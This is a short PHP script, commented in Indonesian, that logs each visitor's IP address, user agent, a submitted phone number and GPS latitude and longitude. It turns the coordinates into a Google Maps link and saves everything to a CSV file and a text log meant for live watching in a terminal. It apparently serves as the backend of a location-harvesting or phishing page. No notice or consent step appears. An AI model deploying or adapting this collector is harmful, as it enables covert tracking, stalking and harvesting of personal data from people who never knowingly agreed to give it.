<?php
date_default_timezone_set("Asia/Jakarta");

// File penyimpanan
$csvFile = "data.csv";
$txtFile = "ip.txt";

// Ambil data
$ip        = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$ua        = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
$number    = $_POST['number'] ?? '';
$lat       = $_POST['lat'] ?? '';
$lng       = $_POST['lng'] ?? '';
$time      = date("Y-m-d H:i:s");

// Link Google Maps
$mapsLink = (!empty($lat) && !empty($lng)) 
  ? "https://www.google.com/maps?q={$lat},{$lng}" 
  : "Lokasi tidak tersedia";

// Simpan ke CSV
$newFile = !file_exists($csvFile);
$fp = fopen($csvFile, "a");
if ($newFile) {
    fputcsv($fp, ["Waktu","IP","UserAgent","Nomor","Lat","Lng","MapsLink"]);
}
fputcsv($fp, [$time, $ip, $ua, $number, $lat, $lng, $mapsLink]);
fclose($fp);

// Simpan ringkasan ke ip.txt untuk dipantau di terminal
$line = "[$time] IP: $ip | Nomor: $number | Maps: $mapsLink" . PHP_EOL;
file_put_contents($txtFile, $line, FILE_APPEND | LOCK_EX);

// Respon ke browser (opsional)
header("Content-Type: application/json");
echo json_encode([
    "ok"    => true,
    "saved" => true,
    "maps"  => $mapsLink
]);
?>
